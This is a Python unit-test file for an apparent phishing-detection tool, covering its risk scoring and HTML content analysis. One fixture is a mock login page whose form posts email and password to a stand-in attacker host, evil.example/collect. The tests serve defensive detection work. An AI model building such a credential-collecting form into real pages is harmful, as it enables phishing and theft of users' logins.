import unittest

from app.analyzers.content import analyze
from app.scoring.engine import score


class ScoringTests(unittest.TestCase):
    def test_keyword_alone_is_informational(self):
        risk, indicators = score({"content": {"keywords": ["login"]}})
        self.assertEqual(risk["level"], "informational")
        self.assertEqual(indicators[0]["severity"], "informational")

    def test_brand_external_form_is_critical(self):
        risk, indicators = score({"content": {"keywords": ["login"], "brand_match": ["paypal"], "forms": [{"sensitive_fields": ["password"], "external_action": True}]}})
        self.assertEqual(risk["score"], 100)
        self.assertEqual(risk["level"], "critical")
        self.assertTrue(any(item["name"] == "brand_external_form" for item in indicators))

    def test_empty_results_are_low(self):
        risk, indicators = score({"tls": {"status": "ok"}, "dns": {"status": "ok"}})
        self.assertEqual(risk, {"score": 0, "level": "low", "reasons": []})
        self.assertEqual(indicators, [])

    def test_content_report_contains_analysis_without_raw_html(self):
        html = b'''<html lang="en"><head><title>Example Login</title></head><body><form action="https://evil.example/collect" method="post"><input name="email" type="email"><input name="password" type="password"></form><a href="https://external.example/page">link</a><script src="https://cdn.example/app.js"></script></body></html>'''
        result = analyze({"status": "ok", "url": "https://example.com/login", "_body": html})
        self.assertEqual(result["title"], "Example Login")
        self.assertEqual(result["language"], "en")
        self.assertEqual(result["body_length"], len(html))
        self.assertNotIn("body", result)
        self.assertEqual(result["links_count"], 1)
        self.assertEqual(result["forms"][0]["method"], "POST")
        self.assertEqual(result["forms"][0]["action"], "https://evil.example/collect")
        self.assertFalse(result["forms"][0]["same_origin"])
        self.assertEqual(result["forms"][0]["fields"], [{"name": "email", "type": "email"}, {"name": "password", "type": "password"}])
        self.assertTrue(result["risk_indicators"] or result["keywords"])

    def test_content_uses_wordlists(self):
        result = analyze({"status": "ok", "url": "https://example.com", "_body": b"Your one-time passcode is required. Netflix security alert."})
        self.assertIn("one-time passcode", result["keywords"])
        self.assertIn("netflix", result["brand_match"])


if __name__ == "__main__":
    unittest.main()
